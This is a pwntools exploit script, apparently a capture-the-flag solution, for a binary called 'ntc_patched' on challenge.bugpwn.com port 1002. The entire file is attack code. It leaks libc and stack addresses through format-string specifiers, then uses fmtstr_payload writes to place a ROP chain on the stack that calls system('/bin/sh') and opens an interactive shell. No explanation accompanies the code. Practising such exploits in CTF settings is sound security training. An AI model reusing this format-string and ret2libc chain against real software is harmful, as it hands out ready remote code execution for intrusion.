#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./ntc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

REMOTE_NC_CMD    = "nc challenge.bugpwn.com 1002"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+142
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main(i):
    r = conn()

    r.sendline(f"A%72$p".encode())
    r.recvuntil(b"A")
    libc.address = int(r.recvuntil(b" "), 16) - libc.sym._IO_2_1_stdout_
    log.info(hex(libc.address))

    r.sendline(f"A%70$p".encode())
    r.recvuntil(b"A")
    stack = int(r.recvuntil(b" "), 16) - 1160

    log.info(hex(stack))
    
    rop = ROP(libc)

    r.sendline(fmtstr_payload(6, {stack:rop.rdi.address}, no_dollars=True).replace(b"a", b"\0"))
    r.sendline(fmtstr_payload(6, {stack+8:libc.binsh()}, no_dollars=True).replace(b"a", b"\0"))
    r.sendline(fmtstr_payload(6, {stack+16:rop.ret.address}, no_dollars=True).replace(b"a", b"\0"))
    r.sendline(fmtstr_payload(6, {stack+24:libc.sym.system}, no_dollars=True).replace(b"a", b"\0"))

    r.sendline(b"")
    r.interactive()

if __name__ == "__main__":
    main(0)